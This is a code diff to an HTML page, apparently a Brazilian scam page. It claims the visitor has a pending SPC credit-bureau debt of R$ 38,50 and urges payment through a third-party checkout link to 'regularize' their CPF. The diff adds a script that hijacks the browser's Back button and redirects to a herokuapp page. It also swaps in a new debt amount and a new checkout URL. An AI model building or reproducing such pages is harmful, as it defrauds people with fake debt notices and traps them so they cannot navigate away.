@@ -35,6 +35,18 @@
         })(window, document, "clarity", "script", "l310i69cic");
     </script>
 
+    <script>
+    (function() {
+    if (window.history && window.history.pushState) {
+        window.history.pushState('forward', null, window.location.href);
+
+        window.onpopstate = function() {
+            window.location.href = 'https://projeto-s-354cda5b1f33.herokuapp.com/pages/index.html';
+        };
+    }
+})();
+    </script>
+
     <title>Verificação</title>
 </head>
 
@@ -89,10 +101,10 @@
 
                     <br><br>
 
-                    Identificamos uma pendência no SPC de R$ 35,80.
+                    Identificamos uma pendência no SPC de R$ 38,50.
                 </p>
 
-                <a id="buttonClick" href="https://pay.segurospag.com/checkout/77581646-369e-4dde-80cb-f112b874a25b" data-upsell="c4f84e7c468ad68f6a538c83fe7b517c">
+                <a id="buttonClick" href="https://pay.segurospag.com/checkout/8a8b0ecf-3e74-4973-a5e3-172f8a90f608" data-upsell="c4f84e7c468ad68f6a538c83fe7b517c">
                     REGULARIZAR SEU CPF RAPIDAMENTE
                 </a>
 
